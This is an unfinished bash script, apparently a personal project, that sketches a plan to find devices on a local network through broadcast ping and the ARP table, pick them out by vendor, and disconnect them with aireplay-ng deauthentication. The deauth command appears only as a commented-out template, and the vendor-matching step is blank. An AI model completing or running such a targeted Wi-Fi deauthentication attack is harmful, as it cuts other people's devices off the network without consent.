#!/bin/bash

## Step 0: Proc user input, error handle a bit

if [ -z "$1" ]; then
    echo "Usage: ./proj.sh OPERATING_SYSTEM"
    exit 1
elif [ "$1" == "--help" ]; then
    echo "Usage: ./proj.sh OPERATING_SYSTEM"
    exit 1
#elif [ "$1" == "OSX" ]
#elif [ "$1" == "Cisco" ]
#elif [ "$1" == "Motorola" ]
#elif [ ... ]
fi

## Step 1: Discover all machines thru broadcast

#echo "$(ping -c 25 -b 255.255.255.255)"

## Step 2: Look at arp table to find MAC Addrs

MACLIST="$(awk ' $1~/[[:digit:]]/ {print $4}' /proc/net/arp)"

echo $MACLIST


## Step 3: check OSX MAC list for matches (use OUI tool parser??)



## Step 4: deauth using aireplay-ng

#find first-hop router's mac address
#route -n ; it's gonna be the one w/ UG flag

#sudo aireplay-ng -0 1 -a [AP MAC] -c [TARGET MAC] -e [ESSID] mon0